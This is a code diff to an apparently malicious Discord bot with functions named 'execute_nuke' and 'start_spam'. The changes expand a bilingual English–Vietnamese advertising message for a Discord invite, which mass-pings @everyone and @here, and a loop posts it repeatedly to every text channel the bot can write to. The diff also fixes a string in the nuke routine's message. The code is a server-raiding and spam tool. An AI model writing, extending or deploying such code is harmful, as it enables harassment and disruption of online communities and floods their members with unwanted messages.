@@ -592,7 +592,7 @@ async def execute_nuke(guild):
             "https://discord.gg/SApjBPkXN\n\n"
             "🎧 𝐍𝐆𝐇𝐈Ệ𝐍 𝐆𝐀𝐌𝐄 𝟐𝟒/𝟕\n"
             "One server, endless fun!\n\n"
-            "|| @everyone||
+            "|| @everyone||\n"
             "|| @here || joinnnn here"
         )
 
@@ -753,9 +753,29 @@ async def start_spam(ctx):
         global is_spamming
         spam_text = (
             "# ≿≺✦≻≾ ᗫꗛꞆɌꗞᎽꗛᗫ ᗹᎽ ᗹꗞꕷꕷ ᗹẢꗞ ĐⱿ (●'◡'●) ≿≺✦≻≾\n"
+            "💬 𝐖𝐇𝐀𝐓 𝐘𝐎𝐔 𝐂𝐀𝐍 𝐅𝐈𝐍𝐃 𝐇𝐄𝐑𝐄:\n"
+            "💬 BẠN CÓ THỂ TÌM THẤY GÌ Ở ĐÂY?\n\n"
+            "✦ New friends & gaming teammates.\n"
+            "→ Bạn mới và đồng đội chơi game.\n\n"
+            "✦ Fun conversations every day.\n"
+            "→ Những cuộc trò chuyện vui vẻ mỗi ngày.\n\n"
+            "✦ Gaming, events & funny moments.\n"
+            "→ Chơi game, tham gia sự kiện và những khoảnh khắc hài hước.\n\n"
+            "✦ Drama, memes & endless fun!\n"
+            "→ Drama, meme và niềm vui bất tận!\n\n"
+            "♡ 𝐍𝐎 𝐍𝐄𝐄𝐃 𝐓𝐎 𝐁𝐄 𝐏𝐑𝐎, 𝐉𝐔𝐒𝐓 𝐁𝐄 𝐘𝐎𝐔𝐑𝐒𝐄𝐋𝐅!\n"
+            "♡ KHÔNG CẦN PHẢI GIỎI GAME, CHỈ CẦN LÀ CHÍNH BẠN!\n\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "🚨 𝐉𝐎𝐈𝐍𝐍𝐍𝐍𝐍 𝐔𝐒 𝐍𝐎𝐖WWWW!!\n"
+            "🚨 THAM GIA NGAYYYYY!!\n\n"
+            "⚠️ 𝐃𝐎𝐍'𝐓 𝐉𝐎𝐈𝐍, 𝐃𝐎𝐍'𝐓 𝐂𝐑𝐘... 𝐁𝐔𝐓 𝐘𝐎𝐔'𝐋𝐋 𝐌𝐈𝐒𝐒 𝐓𝐇𝐄 𝐃𝐑𝐀𝐌𝐀!!\n"
+            "⚠️ KHÔNG VÀO THÌ ĐỪNG TIẾC... VÌ BẠN SẼ BỎ LỠ DRAMAAA!!\n\n"
+            "🔗 𝐉𝐎𝐈𝐍 𝐇𝐄𝐑𝐄:\n"
+            "https://discord.gg/SApjBPkXN\n\n"
+            "🎧 𝐍𝐆𝐇𝐈Ệ𝐍 𝐆𝐀𝐌𝐄 𝟐𝟒/𝟕\n"
+            "One server, endless fun!\n\n"
             "|| @everyone||\n"
-            "|| @here ||\n"
-            ' "|| Dont have a link support ||"'
+            "|| @here || joinnnn here"
         )
         while is_spamming:
             channels = [ch for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
